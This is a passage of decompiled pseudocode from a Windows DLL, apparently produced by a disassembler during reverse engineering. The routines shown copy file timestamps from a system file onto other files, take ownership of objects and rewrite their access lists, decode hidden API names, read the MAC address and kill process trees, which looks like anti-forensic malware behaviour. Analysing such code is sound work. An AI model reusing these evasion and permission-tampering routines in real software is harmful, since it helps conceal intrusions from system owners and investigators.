  char v5; // [esp+14h] [ebp-14h]
  int *v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = &v2;
  v5 = 0;
  v7 = 0;
  v4 = OpenEventA(0x20000u, 0, lpName);
  if ( v4 )
  {
    v5 = 1;
    sub_1000B3DD(&v4);
    LOBYTE(v7) = 1;
  }
  else
  {
    LastError = GetLastError();
    if ( LastError != 2 )
      v5 = 1;
  }
  v7 = -1;
  return v5;
}

//----- (1000B7CD) --------------------------------------------------------
char __cdecl sub_1000B7CD(LPCSTR lpName, DWORD dwMilliseconds)
{
  HANDLE EventA; // eax
  int v4; // [esp+0h] [ebp-28h] BYREF
  DWORD v5; // [esp+Ch] [ebp-1Ch]
  char v6; // [esp+10h] [ebp-18h]
  HANDLE v7[2]; // [esp+14h] [ebp-14h] BYREF
  int v8; // [esp+24h] [ebp-4h]

  v7[1] = &v4;
  v7[0] = 0;
  v6 = 0;
  v8 = 0;
  EventA = CreateEventA(0, 0, 0, lpName);
  v7[0] = EventA;
  if ( EventA && (v5 = WaitForSingleObject(EventA, dwMilliseconds)) == 0 )
    v6 = 1;
  else
    LOBYTE(v8) = 1;
  v8 = -1;
  sub_1000B3DD(v7);
  return v6;
}

//----- (1000B941) --------------------------------------------------------
int sub_1000B941()
{
  int result; // eax

  result = sub_10008918((int)&unk_10014FB8);
  dword_100160E0 = result;
  return result;
}
// 100160E0: using guessed type int dword_100160E0;

//----- (1000B952) --------------------------------------------------------
bool __cdecl sub_1000B952(LPCSTR lpFileName)
{
  return GetFileAttributesA(lpFileName) != -1;
}

//----- (1000B963) --------------------------------------------------------
LPCSTR __cdecl sub_1000B963(LPCSTR lpString)
{
  int v1; // eax
  int v2; // esi
  DWORD LastError; // eax
  CHAR *v4; // eax

  v1 = lstrlenA(lpString);
  v2 = v1;
  if ( v1 > 260 || v1 <= 0 )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  v4 = (CHAR *)&lpString[v2];
  if ( lpString[v2 - 1] != 92 )
  {
    v4[1] = 0;
    *v4 = 92;
  }
  return lpString;
}

//----- (1000B9F2) --------------------------------------------------------
bool __cdecl sub_1000B9F2(LPCSTR lpExistingFileName)
{
  return sub_1000BA00(lpExistingFileName, 0);
}

//----- (1000BA00) --------------------------------------------------------
bool __cdecl sub_1000BA00(LPCSTR lpExistingFileName, LPCSTR lpNewFileName)
{
  return MoveFileExA(lpExistingFileName, lpNewFileName, 5u);
}

//----- (1000BACE) --------------------------------------------------------
int sub_1000BACE()
{
  return 1;
}

//----- (1000BAD2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_1000BAD2@<al>(int a1@<ebp>)
{
  *(_DWORD *)(a1 - 4) = -1;
  return 0;
}
// 1000BAE8: positive sp value C has been found
// 1000BAD2: could not find valid save-restore pair for ebx
// 1000BAD2: could not find valid save-restore pair for edi
// 1000BAD2: could not find valid save-restore pair for esi

//----- (1000BAEA) --------------------------------------------------------
char __cdecl sub_1000BAEA(LPSTR lpFilename, size_t Size)
{
  HMODULE ModuleHandleA; // eax
  DWORD ModuleFileNameA; // eax

  if ( !lpFilename )
    return 0;
  memset(lpFilename, 0, Size);
  ModuleHandleA = GetModuleHandleA(0);
  if ( !ModuleHandleA )
    return 0;
  ModuleFileNameA = GetModuleFileNameA(ModuleHandleA, lpFilename, Size);
  if ( ModuleFileNameA && Size != ModuleFileNameA )
    return 1;
  memset(lpFilename, 0, Size);
  return 0;
}

//----- (1000BB7F) --------------------------------------------------------
HANDLE __cdecl sub_1000BB7F(
        LPCVOID lpBuffer,
        DWORD nNumberOfBytesToWrite,
        LPCSTR lpFileName,
        DWORD dwCreationDisposition)
{
  HANDLE FileA; // edi
  DWORD LastError; // eax
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-24h] BYREF
  int v8; // [esp+10h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]

  v8 = -1;
  ms_exc.registration.TryLevel = 0;
  if ( !lpBuffer )
    RaiseException(0, 0, 0, 0);
  FileA = CreateFileA(lpFileName, 0xC0000000, 0, 0, dwCreationDisposition, 0x80u, 0);
  v8 = (int)FileA;
  if ( FileA == (HANDLE)-1 )
    RaiseException(0, 0, 0, 0);
  if ( !WriteFile(FileA, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  if ( NumberOfBytesWritten != nNumberOfBytesToWrite )
    RaiseException(0, 0, 0, 0);
  return FileA;
}
// 1000BC40: conditional instruction was optimized away because %var_1C.1==1

//----- (1000BC61) --------------------------------------------------------
char __cdecl sub_1000BC61(
        LPCVOID lpBuffer,
        DWORD nNumberOfBytesToWrite,
        LPCSTR lpFileName,
        DWORD dwCreationDisposition)
{
  char v4; // bl
  HANDLE v5; // eax

  v4 = 0;
  v5 = sub_1000BB7F(lpBuffer, nNumberOfBytesToWrite, lpFileName, dwCreationDisposition);
  if ( v5 )
  {
    CloseHandle(v5);
    return 1;
  }
  return v4;
}

//----- (1000BD25) --------------------------------------------------------
int sub_1000BD25()
{
  return 1;
}

//----- (1000BD29) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_1000BD29@<al>(int a1@<ebp>)
{
  *(_DWORD *)(a1 - 4) = -1;
  return 0;
}
// 1000BD3F: positive sp value C has been found
// 1000BD29: could not find valid save-restore pair for ebx
// 1000BD29: could not find valid save-restore pair for edi
// 1000BD29: could not find valid save-restore pair for esi

//----- (1000BD41) --------------------------------------------------------
char __cdecl sub_1000BD41(HANDLE hFile, _BYTE *lpBuffer, DWORD nNumberOfBytesToWrite, char a4, _BYTE *a5)
{
  _BYTE *v5; // esi
  DWORD i; // ecx
  char v7; // al
  char v9; // [esp+18h] [ebp-28h]
  DWORD NumberOfBytesWritten; // [esp+20h] [ebp-20h] BYREF
  CPPEH_RECORD ms_exc; // [esp+28h] [ebp-18h]

  NumberOfBytesWritten = 0;
  v9 = 0;
  v5 = lpBuffer;
  ms_exc.registration.TryLevel = 0;
  if ( !hFile || hFile == (HANDLE)-1 || !nNumberOfBytesToWrite )
  {
    ms_exc.registration.TryLevel = -1;
    return 0;
  }
  if ( a4 != 1 )
    goto LABEL_9;
  v5 = operator new(nNumberOfBytesToWrite);
  if ( v5 )
  {
    for ( i = 0; i < nNumberOfBytesToWrite; ++i )
    {
      v7 = (*a5 + 102) ^ lpBuffer[i];
      v5[i] = v7;
      *a5 = v7;
    }
LABEL_9:
    if ( WriteFile(hFile, v5, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
      v9 = 1;
  }
  ms_exc.registration.TryLevel = -1;
  ms_exc.registration.TryLevel = 1;
  if ( a4 == 1 )
  {
    if ( v5 )
      operator delete(v5);
  }
  return v9;
}

//----- (1000BE44) --------------------------------------------------------
char __cdecl sub_1000BE44(HANDLE hFile, _BYTE *lpBuffer, DWORD nNumberOfBytesToWrite)
{
  int var1; // [esp+3h] [ebp-1h] BYREF

  LOBYTE(var1) = 0;
  return sub_1000BD41(hFile, lpBuffer, nNumberOfBytesToWrite, 0, &var1);
}

//----- (1000C03F) --------------------------------------------------------
int sub_1000C03F()
{
  return 1;
}

//----- (1000C043) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_1000C043@<al>(int a1@<ebp>)
{
  *(_DWORD *)(a1 - 4) = -1;
  return 0;
}
// 1000C059: positive sp value C has been found
// 1000C043: could not find valid save-restore pair for ebx
// 1000C043: could not find valid save-restore pair for edi
// 1000C043: could not find valid save-restore pair for esi

//----- (1000C16D) --------------------------------------------------------
int sub_1000C16D()
{
  return 1;
}

//----- (1000C171) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_1000C171@<al>(int a1@<ebp>)
{
  *(_DWORD *)(a1 - 4) = -1;
  return 0;
}
// 1000C187: positive sp value C has been found
// 1000C171: could not find valid save-restore pair for ebx
// 1000C171: could not find valid save-restore pair for edi
// 1000C171: could not find valid save-restore pair for esi

//----- (1000C189) --------------------------------------------------------
char __cdecl sub_1000C189(LPCSTR lpFileName)
{
  DWORD LastError; // eax
  void (__stdcall *v2)(DWORD, DWORD, DWORD, const ULONG_PTR *); // edi
  const CHAR *v3; // eax
  DWORD v4; // eax
  DWORD v5; // eax
  DWORD v6; // eax
  DWORD v7; // eax
  DWORD v8; // eax
  struct _FILETIME LastAccessTime; // [esp+Ch] [ebp-144h] BYREF
  struct _FILETIME LastWriteTime; // [esp+14h] [ebp-13Ch] BYREF
  struct _FILETIME CreationTime; // [esp+1Ch] [ebp-134h] BYREF
  HANDLE hObject; // [esp+24h] [ebp-12Ch]
  CHAR Buffer[264]; // [esp+28h] [ebp-128h] BYREF
  char v15; // [esp+130h] [ebp-20h]
  HANDLE hFile; // [esp+134h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+138h] [ebp-18h]

  hObject = (HANDLE)-1;
  hFile = (HANDLE)-1;
  ms_exc.registration.TryLevel = 0;
  memset(Buffer, 0, 0x105u);
  if ( GetSystemDirectoryA(Buffer, 0x104u) )
  {
    v2 = RaiseException;
  }
  else
  {
    LastError = GetLastError();
    v2 = RaiseException;
    RaiseException(LastError, 0, 0, 0);
  }
  if ( !sub_1000B963(Buffer) )
    v2(0, 0, 0, 0);
  v3 = (const CHAR *)sub_10008918((int)&unk_10015010);
  if ( !lstrcatA(Buffer, v3) )
  {
    v4 = GetLastError();
    v2(v4, 0, 0, 0);
  }
  hFile = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  if ( hFile == (HANDLE)-1 )
  {
    v5 = GetLastError();
    v2(v5, 0, 0, 0);
  }
  hObject = CreateFileA(lpFileName, 0x100u, 1u, 0, 3u, 0x80u, 0);
  if ( hObject == (HANDLE)-1 )
  {
    v6 = GetLastError();
    v2(v6, 0, 0, 0);
  }
  memset(&CreationTime, 0, sizeof(CreationTime));
  memset(&LastAccessTime, 0, sizeof(LastAccessTime));
  memset(&LastWriteTime, 0, sizeof(LastWriteTime));
  if ( !GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime) )
  {
    v7 = GetLastError();
    v2(v7, 0, 0, 0);
  }
  if ( !SetFileTime(hObject, &CreationTime, &LastAccessTime, &LastWriteTime) )
  {
    v8 = GetLastError();
    v2(v8, 0, 0, 0);
  }
  v15 = 1;
  ms_exc.registration.TryLevel = -1;
  CloseHandle(hObject);
  CloseHandle(hFile);
  return v15;
}

//----- (1000C396) --------------------------------------------------------
_DWORD *__thiscall sub_1000C396(_DWORD *this, int a2, int a3)
{
  _DWORD *result; // eax

  result = this;
  this[1] = a2;
  this[2] = a3;
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  *((_BYTE *)this + 32) = 0;
  *((_BYTE *)this + 33) = 0;
  *this = off_1001073C;
  return result;
}
// 1001073C: using guessed type int (__thiscall *off_1001073C[2])(void *, char);

//----- (1000C3C6) --------------------------------------------------------
_DWORD *__thiscall sub_1000C3C6(_DWORD *this, char a2)
{
  sub_1000C3E2(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (1000C3E2) --------------------------------------------------------
void __thiscall sub_1000C3E2(_DWORD *this)
{
  *this = off_1001073C;
}
// 1001073C: using guessed type int (__thiscall *off_1001073C[2])(void *, char);

//----- (1000C3E9) --------------------------------------------------------
char __thiscall sub_1000C3E9(_BYTE *this)
{
  if ( sub_1000C59E((int)this) )
  {
    this[33] = 1;
    return 1;
  }
  else
  {
    sub_1000C408((int)this);
    return 0;
  }
}

//----- (1000C408) --------------------------------------------------------
char __thiscall sub_1000C408(int this)
{
  char v3; // bl

  if ( !*(_BYTE *)(this + 33) )
    return 1;
  v3 = 1;
  if ( (*(_BYTE *)(this + 32) & 0x30) == 48 )
  {
    if ( SetNamedSecurityInfoA(*(LPSTR *)(this + 4), *(SE_OBJECT_TYPE *)(this + 8), 4u, 0, 0, *(PACL *)(this + 28), 0) )
      v3 = 0;
    else
      *(_BYTE *)(this + 32) &= 0xCFu;
  }
  if ( (*(_BYTE *)(this + 32) & 0x20) == 32 )
  {
    if ( SetNamedSecurityInfoA(*(LPSTR *)(this + 4), *(SE_OBJECT_TYPE *)(this + 8), 1u, *(PSID *)(this + 24), 0, 0, 0) )
      v3 = 0;
    else
      *(_BYTE *)(this + 32) &= ~0x20u;
  }
  if ( (*(_BYTE *)(this + 32) & 0x10) == 16 )
  {
    if ( FreeSid(*(PSID *)(this + 16)) )
      v3 = 0;
    else
      *(_BYTE *)(this + 32) &= ~0x10u;
  }
  if ( (*(_BYTE *)(this + 32) & 8) == 8 )
  {
    if ( sub_1000C51E(*(HANDLE *)(this + 12), Name, 0) )
      *(_BYTE *)(this + 32) &= ~8u;
    else
      v3 = 0;
  }
  if ( (*(_BYTE *)(this + 32) & 4) == 4 )
  {
    if ( sub_1000C51E(*(HANDLE *)(this + 12), aSetakeownershi, 0) )
      *(_BYTE *)(this + 32) &= ~4u;
    else
      v3 = 0;
  }
  if ( (*(_BYTE *)(this + 32) & 2) == 2 )
  {
    if ( sub_1000B3DD((HANDLE *)(this + 12)) )
      *(_BYTE *)(this + 32) &= ~2u;
    else
      v3 = 0;
  }
  if ( (*(_BYTE *)(this + 32) & 1) == 1 )
  {
    if ( LocalFree(*(HLOCAL *)(this + 20)) )
      return 0;
    else
      *(_BYTE *)(this + 32) &= ~1u;
  }
  return v3;
}

//----- (1000C51E) --------------------------------------------------------
bool __cdecl sub_1000C51E(HANDLE TokenHandle, LPCSTR lpName, char a3)
{
  bool result; // al
  struct _TOKEN_PRIVILEGES NewState; // [esp+8h] [ebp-18h] BYREF
  struct _LUID Luid; // [esp+18h] [ebp-8h] BYREF

  Luid.LowPart = 0;
  Luid.HighPart = 0;
  result = 0;
  if ( LookupPrivilegeValueA(0, lpName, &Luid) )
  {
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Luid = Luid;
    lpName = 0;
    NewState.Privileges[0].Attributes = a3 != 0 ? 2 : 0;
    if ( AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, (PDWORD)&lpName) )
    {
      if ( GetLastError() != 1300 )
        return 1;
    }
  }
  return result;
}

//----- (1000C59E) --------------------------------------------------------
char __thiscall sub_1000C59E(int this)
{
  HANDLE *v2; // edi
  HANDLE CurrentProcess; // eax
  CHAR *v4; // eax
  struct _EXPLICIT_ACCESS_A pListOfExplicitEntries; // [esp+Ch] [ebp-2Ch] BYREF
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+2Ch] [ebp-Ch] BYREF
  PACL NewAcl; // [esp+34h] [ebp-4h] BYREF

  if ( *(_BYTE *)(this + 32) )
    return 0;
  if ( GetNamedSecurityInfoA(
         *(LPCSTR *)(this + 4),
         *(SE_OBJECT_TYPE *)(this + 8),
         5u,
         (PSID *)(this + 24),
         0,
         (PACL *)(this + 28),
         0,
         (PSECURITY_DESCRIPTOR *)(this + 20)) )
  {
    return 0;
  }
  *(_BYTE *)(this + 32) |= 1u;
  v2 = (HANDLE *)(this + 12);
  CurrentProcess = GetCurrentProcess();
  if ( !OpenProcessToken(CurrentProcess, 0x20u, (PHANDLE)(this + 12)) )
    return 0;
  *(_BYTE *)(this + 32) |= 2u;
  if ( !sub_1000C51E(*v2, aSetakeownershi, 1) )
    return 0;
  *(_BYTE *)(this + 32) |= 4u;
  if ( !sub_1000C51E(*v2, Name, 1) )
    return 0;
  *(_BYTE *)(this + 32) |= 8u;
  pIdentifierAuthority.Value[0] = 0;
  pIdentifierAuthority.Value[1] = 0;
  pIdentifierAuthority.Value[2] = 0;
  pIdentifierAuthority.Value[3] = 0;
  pIdentifierAuthority.Value[4] = 0;
  pIdentifierAuthority.Value[5] = 1;
  if ( !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, (PSID *)(this + 16)) )
    return 0;
  *(_BYTE *)(this + 32) |= 0x10u;
  if ( SetNamedSecurityInfoA(*(LPSTR *)(this + 4), *(SE_OBJECT_TYPE *)(this + 8), 1u, *(PSID *)(this + 16), 0, 0, 0) )
    return 0;
  *(_BYTE *)(this + 32) |= 0x20u;
  NewAcl = 0;
  memset(&pListOfExplicitEntries.grfAccessMode, 0, 0x1Cu);
  pListOfExplicitEntries.grfAccessPermissions = (DWORD)&_ImageBase;
  pListOfExplicitEntries.grfAccessMode = SET_ACCESS;
  pListOfExplicitEntries.grfInheritance = 2;
  v4 = *(CHAR **)(this + 16);
  pListOfExplicitEntries.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
  pListOfExplicitEntries.Trustee.ptstrName = v4;
  pListOfExplicitEntries.Trustee.TrusteeForm = TRUSTEE_IS_SID;
  pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
  if ( SetEntriesInAclA(1u, &pListOfExplicitEntries, 0, &NewAcl)
    || SetNamedSecurityInfoA(*(LPSTR *)(this + 4), *(SE_OBJECT_TYPE *)(this + 8), 4u, 0, 0, NewAcl, 0) )
  {
    return 0;
  }
  *(_BYTE *)(this + 32) |= 0x30u;
  return 1;
}
// 10000000: using guessed type __int16 _ImageBase;

//----- (1000C6ED) --------------------------------------------------------
_DWORD *__thiscall sub_1000C6ED(_DWORD *this, char a2, LPCSTR lpSrc, int a4, int a5)
{
  const CHAR *v6; // eax
  CHAR Dst[264]; // [esp+8h] [ebp-114h] BYREF
  int v9; // [esp+118h] [ebp-4h]

  v9 = 0;
  *this = &off_10010740;
  memset(Dst, 0, 0x105u);
  v6 = lpSrc;
  if ( !lpSrc )
    v6 = (const CHAR *)`std::string::_Nullstr'::`2'::_C;
  if ( ExpandEnvironmentStringsA(v6, Dst, 0x105u) )
    this[1] = LoadLibraryA(Dst);
  v9 = -1;
  std::string::_Tidy(&a2, 1);
  return this;
}
// 1001013C: using guessed type int __thiscall std::string::_Tidy(_DWORD, _DWORD);
// 10010740: using guessed type int (__thiscall *off_10010740)(void *, char);

//----- (1000C772) --------------------------------------------------------
_DWORD *__thiscall sub_1000C772(_DWORD *this, char a2)
{
  sub_1000C78E(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (1000C78E) --------------------------------------------------------
BOOL __thiscall sub_1000C78E(_DWORD *this)
{
  HMODULE v1; // ecx
  BOOL result; // eax

  *this = &off_10010740;
  v1 = (HMODULE)this[1];
  if ( v1 )
  {
    if ( v1 != (HMODULE)-1 )
      return FreeLibrary(v1);
  }
  return result;
}
// 10010740: using guessed type int (__thiscall *off_10010740)(void *, char);

//----- (1000C7A8) --------------------------------------------------------
int __thiscall sub_1000C7A8(_DWORD *this, char a2, LPCSTR lpProcName, int a4, int a5, int a6, int *a7)
{
  int v7; // esi
  HMODULE v8; // eax
  const CHAR *v9; // ecx
  FARPROC ProcAddress; // eax
  int v11; // eax
  _DWORD v13[10]; // [esp+0h] [ebp-34h] BYREF
  int v14; // [esp+30h] [ebp-4h]

  v13[9] = v13;
  v7 = 0;
  v14 = 1;
  v8 = (HMODULE)this[1];
  if ( v8 )
  {
    v9 = lpProcName;
    if ( !lpProcName )
      v9 = (const CHAR *)`std::string::_Nullstr'::`2'::_C;
    ProcAddress = GetProcAddress(v8, v9);
    v13[8] = ProcAddress;
    if ( ProcAddress )
    {
      if ( a6 )
        v11 = ((int (__stdcall *)(int))ProcAddress)(a6);
      else
        v11 = ProcAddress();
      *a7 = v11;
      v14 = 0;
    }
    else
    {
      v7 = 3;
      v13[6] = 3;
    }
  }
  else
  {
    v7 = 2;
    v13[7] = 2;
  }
  v14 = -1;
  std::string::_Tidy(&a2, 1);
  return v7;
}
// 1001013C: using guessed type int __thiscall std::string::_Tidy(_DWORD, _DWORD);

//----- (1000C83A) --------------------------------------------------------
char __cdecl sub_1000C83A(void *a1, int a2)
{
  unsigned int *v2; // esi
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  FARPROC ProcAddress; // eax
  unsigned int i; // eax
  unsigned int *v7; // ecx
  int v9; // [esp+Ch] [ebp-34h] BYREF
  unsigned int v11; // [esp+14h] [ebp-2Ch]
  FARPROC v12; // [esp+18h] [ebp-28h]
  char v13; // [esp+1Ch] [ebp-24h]
  unsigned int *v14; // [esp+20h] [ebp-20h]
  HMODULE hModule; // [esp+24h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+28h] [ebp-18h]

  v13 = 0;
  hModule = 0;
  v2 = 0;
  v14 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( a1 )
  {
    if ( a2 == 6 )
    {
      v9 = 17200;
      v2 = (unsigned int *)malloc(0x4330u);
      v14 = v2;
      if ( v2 )
      {
        v3 = (const CHAR *)sub_10008918((int)&unk_1001508C);
        hModule = LoadLibraryA(v3);
        if ( hModule )
        {
          v4 = (const CHAR *)sub_10008918((int)&unk_10015068);
          ProcAddress = GetProcAddress(hModule, v4);
          v12 = ProcAddress;
          if ( ProcAddress )
          {
            if ( !((int (__stdcall *)(unsigned int *, int *, _DWORD))ProcAddress)(v2, &v9, 0) )
            {
              for ( i = 0; ; ++i )
              {
                v11 = i;
                if ( i >= *v2 )
                  break;
                v7 = &v2[215 * i];
                if ( v7[130] == 6 && v7[133] == 6 )
                {
                  memcpy(a1, &v2[215 * i + 134], 6u);
                  v13 = 1;
                  break;
                }
              }
            }
          }
        }
      }
    }
  }
  ms_exc.registration.TryLevel = -1;
  if ( hModule )
    FreeLibrary(hModule);
  if ( v2 )
    free(v2);
  return v13;
}

//----- (1000C962) --------------------------------------------------------
int sub_1000C962()
{
  int v0; // esi
  char Src[8]; // [esp+4h] [ebp-10h] BYREF
  int v3; // [esp+Ch] [ebp-8h] BYREF
  int v4; // [esp+10h] [ebp-4h] BYREF

  v0 = 0;
  v3 = 0;
  v4 = 0;
  memset(Src, 0, 6u);
  if ( sub_1000C83A(Src, 6) == 1 )
  {
    memcpy(&v3, Src, sizeof(v3));
    memcpy(&v4, &Src[4], 2u);
    return v3 ^ v4;
  }
  return v0;
}

//----- (1000C9BB) --------------------------------------------------------
char __cdecl sub_1000C9BB(LPSTR lpString1, int String2)
{
  int v2; // esi
  char v4[8]; // [esp+4h] [ebp-8h] BYREF

  v2 = 0;
  memset(v4, 0, 6u);
  if ( lpString1 && String2 == 13 && sub_1000C83A(v4, 6) && lstrcpyA(lpString1, ::String2) )
  {
    while ( wsprintfA((LPSTR)&String2, "%02X", (unsigned __int8)v4[v2]) >= 2 && lstrcatA(lpString1, (LPCSTR)&String2) )
    {
      if ( (unsigned int)++v2 >= 6 )
        return 1;
    }
  }
  return 0;
}
// 1000C9BB: using guessed type char var_8[8];

//----- (1000CA42) --------------------------------------------------------
const CHAR *sub_1000CA42()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100150C0);
  dword_100160E4 = result;
  return result;
}

//----- (1000CA53) --------------------------------------------------------
BOOL __cdecl sub_1000CA53(DWORD dwProcessId, DWORD *pSessionId)
{
  return ProcessIdToSessionId(dwProcessId, pSessionId);
}

//----- (1000CA68) --------------------------------------------------------
int __cdecl sub_1000CA68(LPCSTR lpString1, DWORD *a2, char a3)
{
  return sub_1000CA7F(lpString1, a2, 0, a3);
}

//----- (1000CA7F) --------------------------------------------------------
int __cdecl sub_1000CA7F(LPCSTR lpString1, DWORD *a2, int a3, char a4)
{
  DWORD CurrentProcessId; // eax
  int v6; // [esp+0h] [ebp-554h] BYREF
  CHAR String1[1021]; // [esp+Ch] [ebp-548h] BYREF
  __int16 v8; // [esp+409h] [ebp-14Bh]
  char v9; // [esp+40Bh] [ebp-149h]
  DWORD v10; // [esp+40Ch] [ebp-148h] BYREF
  DWORD pSessionId; // [esp+410h] [ebp-144h] BYREF
  PROCESSENTRY32 pe; // [esp+414h] [ebp-140h] BYREF
  int v13; // [esp+53Ch] [ebp-18h]
  HANDLE hSnapshot; // [esp+540h] [ebp-14h]
  int *v15; // [esp+544h] [ebp-10h]
  int v16; // [esp+550h] [ebp-4h]

  v15 = &v6;
  v13 = 2;
  hSnapshot = (HANDLE)-1;
  v16 = 0;
  *a2 = 0;
  pSessionId = 0;
  if ( a4 == 1 && (CurrentProcessId = GetCurrentProcessId(), !sub_1000CA53(CurrentProcessId, &pSessionId))
    || (hSnapshot = CreateToolhelp32Snapshot(2u, 0), hSnapshot == (HANDLE)-1)
    || (memset(&pe, 0, sizeof(pe)), pe.dwSize = 296, !Process32First(hSnapshot, &pe)) )
  {
LABEL_13:
    LOBYTE(v16) = 1;
  }
  else
  {
    do
    {
      if ( !lstrcmpiA(lpString1, pe.szExeFile) )
      {
        v10 = 0;
        if ( a4 == 1 && !sub_1000CA53(pe.th32ProcessID, &v10) )
          goto LABEL_13;
        if ( v10 == pSessionId )
        {
          if ( !a3 )
            goto LABEL_12;
          memset(String1, 0, sizeof(String1));
          v8 = 0;
          v9 = 0;
          if ( !sub_1000CC2C(pe.th32ProcessID, String1, 0x400u) )
            goto LABEL_13;
          if ( !lstrcmpiA(String1, String1) )
          {
LABEL_12:
            *a2 = pe.th32ProcessID;
            v13 = 0;
            goto LABEL_13;
          }
        }
      }
    }
    while ( Process32Next(hSnapshot, &pe) );
    if ( GetLastError() == 18 )
      v13 = 1;
  }
  v16 = -1;
  if ( hSnapshot != (HANDLE)-1 )
    CloseHandle(hSnapshot);
  return v13;
}

//----- (1000CC2C) --------------------------------------------------------
bool __cdecl sub_1000CC2C(DWORD dwProcessId, LPSTR Name, size_t Size)
{
  DWORD LastError; // eax
  DWORD v4; // eax
  DWORD v5; // eax
  bool v6; // bl
  DWORD cchReferencedDomainName; // [esp+10h] [ebp-834h] BYREF
  int TokenInformation[256]; // [esp+14h] [ebp-830h] BYREF
  CHAR ReferencedDomainName[1024]; // [esp+414h] [ebp-430h] BYREF
  DWORD ReturnLength; // [esp+814h] [ebp-30h] BYREF
  DWORD cchName; // [esp+818h] [ebp-2Ch] BYREF
  enum _SID_NAME_USE peUse; // [esp+81Ch] [ebp-28h] BYREF
  HANDLE TokenHandle; // [esp+820h] [ebp-24h] BYREF
  HANDLE ProcessHandle; // [esp+824h] [ebp-20h]
  bool v16; // [esp+828h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+82Ch] [ebp-18h]

  TokenHandle = 0;
  ms_exc.registration.TryLevel = 0;
  memset(Name, 0, Size);
  ProcessHandle = OpenProcess(0x400u, 0, dwProcessId);
  if ( !ProcessHandle )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  if ( !OpenProcessToken(ProcessHandle, 8u, &TokenHandle) )
  {
    v4 = GetLastError();
    RaiseException(v4, 0, 0, 0);
  }
  ReturnLength = 0;
  memset(TokenInformation, 0, sizeof(TokenInformation));
  if ( !GetTokenInformation(TokenHandle, TokenUser, TokenInformation, 0x400u, &ReturnLength) )
  {
    v5 = GetLastError();
    RaiseException(v5, 0, 0, 0);
  }
  memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));
  cchReferencedDomainName = 1024;
  cchName = Size;
  peUse = SidTypeInvalid;
  v6 = LookupAccountSidA(
         0,
         (PSID)TokenInformation[0],
         Name,
         &cchName,
         ReferencedDomainName,
         &cchReferencedDomainName,
         &peUse);
  v16 = v6;
  ms_exc.registration.TryLevel = -1;
  CloseHandle(TokenHandle);
  CloseHandle(ProcessHandle);
  return v6;
}

//----- (1000CD87) --------------------------------------------------------
char __cdecl sub_1000CD87(DWORD dwProcessId, int a2)
{
  int Toolhelp32Snapshot; // edi
  BOOL i; // eax
  HANDLE v4; // eax
  void *v5; // ebx
  PROCESSENTRY32 pe; // [esp+Ch] [ebp-12Ch] BYREF
  char v8; // [esp+137h] [ebp-1h]

  Toolhelp32Snapshot = -1;
  v8 = 1;
  if ( a2 )
  {
    Toolhelp32Snapshot = (int)CreateToolhelp32Snapshot(2u, 0);
    if ( Toolhelp32Snapshot != -1 )
    {
      memset(&pe, 0, sizeof(pe));
      pe.dwSize = 296;
      for ( i = Process32First((HANDLE)Toolhelp32Snapshot, &pe); i; i = Process32Next((HANDLE)Toolhelp32Snapshot, &pe) )
      {
        if ( pe.th32ParentProcessID == dwProcessId && !(unsigned __int8)sub_1000CD87(pe.th32ProcessID, a2 - 1) )
          v8 = 0;
      }
    }
  }
  Sleep(0x2EEu);
  v4 = OpenProcess(1u, 0, dwProcessId);
  v5 = v4;
  if ( v4 )
  {
    if ( TerminateProcess(v4, 0) )
      goto LABEL_14;
  }
  else if ( GetLastError() == 87 )
  {
    goto LABEL_14;
  }
  v8 = 0;
LABEL_14:
  if ( Toolhelp32Snapshot != -1 )
    CloseHandle((HANDLE)Toolhelp32Snapshot);
  if ( v5 )
    CloseHandle(v5);
  return v8;
}

//----- (1000CE6A) --------------------------------------------------------
char __cdecl sub_1000CE6A(DWORD dwProcessId)
{
  return sub_1000CD87(dwProcessId, 6);
}

//----- (1000CE78) --------------------------------------------------------
bool __cdecl sub_1000CE78(LPCSTR lpString2, LPCSTR lpString1)
{
  return (!lpString2 || sub_1000CF46(lpString2)) && (!lpString1 || sub_1000CEA8(lpString1));
}

//----- (1000CEA8) --------------------------------------------------------
char __cdecl sub_1000CEA8(LPCSTR lpString1)
{
  char v1; // bl
  DWORD pcbBuffer; // [esp+Ch] [ebp-120h] BYREF
  char v4; // [esp+10h] [ebp-11Ch]
  CHAR Buffer[256]; // [esp+14h] [ebp-118h] BYREF
  CPPEH_RECORD ms_exc; // [esp+114h] [ebp-18h]

  pcbBuffer = 256;
  v1 = 0;
  ms_exc.registration.TryLevel = 0;
  memset(Buffer, 0, sizeof(Buffer));
